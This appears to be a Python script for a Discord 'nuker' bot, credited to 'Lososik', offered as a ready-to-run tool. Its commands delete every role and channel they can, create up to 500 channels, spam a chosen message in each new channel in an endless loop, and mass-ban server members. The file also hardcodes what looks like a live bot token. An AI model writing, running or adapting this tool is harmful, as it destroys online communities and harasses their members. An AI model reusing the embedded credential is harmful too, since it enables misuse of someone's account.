from discord.ext import commands
import threading
import discord

print('╭━━━┳╮╱╭┳━━━┳━━━┳╮╱╱╭╮╭╮╭━┳━━┳╮╱╱╭╮╱╱╭━━━┳━━━╮╭━╮╱╭┳╮╱╭┳╮╭━┳━━━┳━━━╮')
print('┃╭━╮┃┃╱┃┃╭━╮┃╭━╮┃╰╮╭╯┃┃┃┃╭┻┫┣┫┃╱╱┃┃╱╱┃╭━━┫╭━╮┃┃┃╰╮┃┃┃╱┃┃┃┃╭┫╭━━┫╭━╮┃')
print('┃╰━╯┃┃╱┃┃╰━━┫╰━━╋╮╰╯╭╯┃╰╯╯╱┃┃┃┃╱╱┃┃╱╱┃╰━━┫╰━╯┃┃╭╮╰╯┃┃╱┃┃╰╯╯┃╰━━┫╰━╯┃')
print('┃╭━━┫┃╱┃┣━━╮┣━━╮┃╰╮╭╯╱┃╭╮┃╱┃┃┃┃╱╭┫┃╱╭┫╭━━┫╭╮╭╯┃┃╰╮┃┃┃╱┃┃╭╮┃┃╭━━┫╭╮╭╯')
print('┃┃╱╱┃╰━╯┃╰━╯┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┫╰━╯┃╰━╯┃╰━━┫┃┃╰╮┃┃╱┃┃┃╰━╯┃┃┃╰┫╰━━┫┃┃╰╮')
print('╰╯╱╱╰━━━┻━━━┻━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━┻━━━┻━━━┻╯╰━╯╰╯╱╰━┻━━━┻╯╰━┻━━━┻╯╰━╯')
print('                                                     Made by Lososik')

print('1) Nuke')
print('2) Ban')

TOKEN = 'ODg5NTgxMzM0NDU1MDA5MzYx.YUjVLQ.GUdq5CkyaLXGxcZEZekhy8EGdj8'
MAX_CHANNELS = 500


choice = int(input())


if choice == 1:
    chanless = input('Channels names: ')
    spam = input('Message you wanna spam: ')
    print('For nuke write to chat: !Nuke')


if choice == 2:
    reason = input('Bans reason: ')
    print('For for banning one guy write to chat: !OneBan')
    print('For mass ban write to chat: !Ban')


client = commands.Bot(command_prefix="!")

@client.command()
async def Nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    for role in guild.roles:
        try:
            await role.delete()
            print(f"{role.name} Has been deleted")
        except:
            print(f"{role.name} Has not been deleted")

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} Has been deleted")
        except:
            print(f'You cant delete {channel}')

    try:
        for i in range(MAX_CHANNELS):
            await guild.create_text_channel(chanless)
            print(f"{chanless} has been created")
    except:
        print('You havent got permission to create channels')

@client.command(pass_context=True)
async def Ban(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print("User " + member.name + " has been banned")
        except:
            print('You havent got permission to ban :(')


@client.command()
async def OneBan(ctx, member : discord.Member):
    await ctx.message.delete()
    try:
        await member.ban(reason=reason)
        print(f'{member} was banned')
    except:
        print(f'You dont have permission to ban {member}')

@client.event
async def on_guild_channel_create(channel):
    while True:
        try:
            await channel.send(spam)
            print('SPAMMIMG :)')

        except:
            print('You cant spam lmaoooo')

def thread():
        threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()

client.run(TOKEN)
